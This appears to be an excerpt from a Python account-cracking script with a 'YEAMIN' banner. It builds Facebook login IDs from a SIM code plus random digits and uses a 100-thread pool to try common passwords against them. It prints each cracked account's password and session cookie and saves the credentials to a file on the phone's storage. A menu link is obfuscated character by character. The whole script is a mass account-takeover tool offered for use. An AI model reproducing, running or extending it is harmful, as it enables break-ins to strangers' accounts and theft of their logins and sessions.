...
from rich import print as yeamin
 ...
 \  $$ /$$/ | $$      | $$  \ $$| $$$$  /$$$$  | $$  | $$$$| $$
  \  $$$$/  | $$$$$   | $$$$$$$$| $$ $$/$$ $$  | $$  | $$ $$ $$
   \  $$/   | $$__/   | $$__  $$| $$  $$$| $$  | $$  | $$  $$$$
    | $$    | $$      | $$  | $$| $$\  $ | $$  | $$  | $$\  $$$
    | $$    | $$$$$$$$| $$  | $$| $$ \/  | $$ /$$$$$$| $$ \  $$
    |__/    |________/|__/  |__/|__/     |__/|______/|__/  \__/
...
def clear():
	os.system('clear')
def main():
	clear();yeamin(logo);yeamin(i);yeamin(M)
	yeamin23=input('  Choice : ')
	if yeamin23 in ['1','01','a','A']:tyrin()
	if yeamin23 in ['2','02','b','B']:os.system('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'p'+'r'+'o'+'f'+'i'+'l'+'e'+'.'+'p'+'h'+'p'+'?'+'i'+'d'+'='+'1'+'0'+'0'+'0'+'9'+'0'+'7'+'4'+'0'+'7'+'7'+'9'+'8'+'1'+'2')
	if yeamin23 in ['3','03','c','C']:info()
	else:
		exit()
		
def info():
	clear();yeamin(logo);yeamin(i);yeamin(I)
...
def tyrin():
    ...
    os.getuid
    os.geteuid
    clear();yeamin(logo);yeamin(i);yeamin(k)
    code = input('  SIM CODE : ')
    clear();yeamin(logo);yeamin(i);yeamin(h)
    limit=int(input("  CRACKING LIMIT : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=100) as Yeamin_Vai:
        tl = str(len(user))
        clear();yeamin(logo);yeamin(i)
        yeamin(Panel(f'\t\t[bold green]YOUR SIM CODE : '+code))
        yeamin(Panel(f'\t\t[bold green]CRACKING LIMIT: '+tl))
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Yeamin_Vai.submit(nodi,uid,pwx,tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                yeamin(f' [white]~ [red3][[bold bright_yellow]IM OK ACCOUNT💚[red3]][bright_yellow]-> [bold bright_green]'+uid+' = '+ps+'')
                yeamin(f' [white]~ [red3][[bold bright_yellow]IM COOKIE💜[red3]][bright_yellow]-> [bold bright_green]'+coki)
                open('/sdcard/YEAMIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
